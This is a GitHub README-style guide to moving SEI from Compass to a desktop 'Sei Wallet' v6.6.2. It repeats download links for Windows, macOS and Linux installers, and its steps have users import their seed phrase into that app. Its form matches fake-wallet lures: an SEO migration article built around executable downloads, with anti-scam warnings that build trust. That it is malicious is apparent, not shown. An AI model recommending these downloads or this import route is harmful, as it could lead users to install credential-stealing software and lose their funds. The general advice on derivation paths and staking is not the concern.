![Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/raw/main/assets/banner-article.png)

<h1 align="center">Moving SEI off Compass to Sei Wallet</h1>

<p align="center">Move a balance out of Compass and confirm it arrived on the other side.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=windows&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=linux&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

| Platform | Requirements | File |
|:--|:--|:--|
| 🪟 Windows | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| 🍎 macOS | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| 🐧 Linux | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

Whatever has become of the Compass application, the SEI you held in it did not go anywhere. Compass is an interface: it holds a key, shows a balance, and signs transactions. The balance lives on the Sei chain, addressed by a key you still control — which means "recovering" from Compass is mostly a matter of putting that key into a wallet that still exists and letting it read the same account.

The awkward part is not the transfer. It is that the same key can show up as a different `0x` address in a different wallet, and that staked positions have to be unbonded rather than moved.

## What moves, and what does not

A wallet is a window onto an account. The account — its balance, its delegations, its history — lives at an address on the Sei chain, so changing the window does not move the contents. That is why a migration is mostly a matter of opening the same account somewhere else, and why panic is the most expensive thing to bring to it.

The chain is unaffected by any of this. Balances, delegations and transaction history remain where they were, indexed by Sei explorers. Nothing has to be withdrawn first, and nothing is lost for having waited.

## Step 1: stop, and do not import anything yet

The first move when changing wallets is usually the wrong one: typing the seed phrase into the first site that offers to help. Those pages exist because migrations create a market for them, and a page that asks for your seed phrase is not recovering anything — it is taking the account.

The rule is simple and absolute: a seed phrase goes into a wallet application you installed yourself, and nowhere else. Not a website, not a support chat, not a form, not a "migration tool". The scam shapes are consistent: urgency, a form, and a reason your phrase is needed.

## Step 2: note what you had

Before changing anything, write down three things from whatever record you still have:

- the address Compass showed for your account, in whichever form you can find it;
- whether anything was staked, and with which validator if you can tell;
- whether the account was backed by a Ledger device rather than by a seed phrase stored on the machine.

That third point changes the recovery path completely. If the key was on a Ledger, there is nothing to import — you reconnect the device to a wallet that supports it, and the account reappears. That route is in [connecting a Ledger](https://github.com/sei-chain/sei-wallet-help/blob/main/connect-a-ledger-device.md).

## Step 3: install a wallet that reads the chain

Any current Sei wallet will do; the differences are staking, address handling and hardware support. If you have not chosen one, the overview of what this desktop application does — and what it explicitly does not promise — is in [the desktop wallet overview](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md).

Install it from the operator's own domain, and check the publisher your operating system reports before you run it. That habit matters more during a migration than at any other time, because fake installers cluster around exactly this moment.

## Step 4: import, and expect a different-looking address

Restoring from a seed phrase recreates the account from the key. Two things routinely surprise people:

**The `0x` address may differ from the one Compass showed.** Wallets derive accounts using different derivation settings, and a Compass-era account may sit on a different derivation path than the one a new wallet picks by default. If the balance is missing after import, the seed is not wrong — the selected account probably is. Most wallets let you step through derivations or add another account until the known address appears.

**The `sei1` form may not match the `0x` form you remember.** They are the same account seen through two address schemes, and association between them is a chain-level state rather than a wallet setting.

Before moving anything, confirm the imported address matches the one you wrote down. If it does not, keep stepping through accounts rather than sending funds to "test" it.

## Step 5: deal with the staked position

A delegation cannot be moved between wallets — it belongs to the account, and it will be visible from any wallet that reads that account. What you do with it depends on what you want next:

- **Leave it staked.** It continues under the same validator, visible from the new wallet. Nothing needs to happen.
- **Move validators.** Redelegation is the right tool and takes effect immediately.
- **Exit.** Unstaking starts an unbonding period, during which the coins are neither liquid nor earning.

Whichever you choose, keep a small liquid balance for fees. An account with everything bonded and nothing liquid cannot pay for the unbonding transaction, which turns a routine exit into a wait for someone else to send you a small amount.

## Step 6: remove the old install

Uninstall the Compass extension or app when you are satisfied the new wallet shows the right account. An application you have moved away from is one more thing to keep updated, and one more surface you are not watching.

If you downloaded Compass from a third-party software directory rather than from the original publisher, check whether that listing still points at the publisher's own build. Directory listings are not always updated when the publisher's download changes, and an out-of-date installer is the wrong thing to run.

## If you were on Leap rather than Compass

Compass is Leap's Sei-specific sibling, and the route for extension and mobile users is in [migrating from Leap Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/migrate-an-account-from-leap.md).

## If you would rather move somewhere else entirely

Compass users frequently land on Keplr because it was the wallet they used before Compass existed; that path is in [moving SEI from Keplr](https://github.com/sei-chain/sei-wallet-setup/blob/main/move-coins-out-of-keplr.md). If your SEI is sitting in Trust Wallet or on an exchange, the routes are [moving SEI out of Trust Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/send-coins-out-of-trust.md) and [withdrawing SEI from an exchange](https://github.com/sei-chain/sei-wallet-setup/blob/main/withdraw-from-an-exchange.md).

## Frequently asked questions

**What is a Compass wallet?** Compass Wallet for Sei is a Sei-focused wallet from the Leap team, available as a browser extension and mobile app. Its current support status is not something this article tracks.

**Is Compass wallet safe to keep using?** That depends on its publisher's support, which this article does not track. What it can tell you is how to move the account to a wallet you do follow.

**Did I lose my SEI when I moved off Compass?** No. The balance is on the chain, addressed by your key. Only the interface changed.

**Can I recover a Compass account without the seed phrase?** Only through a hardware wallet that holds the key, or another device where the wallet is still installed and unlocked. There is no server-side reset.

**Do I have to unstake before migrating?** No. The delegation follows the account. Unstake only if you want the coins liquid.

**Why does my balance show zero after importing?** Almost always the wrong derivation or the wrong address view, not a lost account. Compare the address before doing anything else.

## Download Sei Wallet

| Platform | Installer |
|:--|:--|
| 🪟 Windows | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| 🍎 macOS | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| 🐧 Linux | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.

## Related articles

- [Using a Ledger hardware wallet with Sei Wallet](https://github.com/sei-chain/sei-wallet-help/blob/main/connect-a-ledger-device.md)
- [What Sei Wallet is and how a desktop Sei wallet works](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md)
- [Migrating SEI from Leap Wallet to Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/migrate-an-account-from-leap.md)
- [Moving SEI from Keplr to Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/move-coins-out-of-keplr.md)
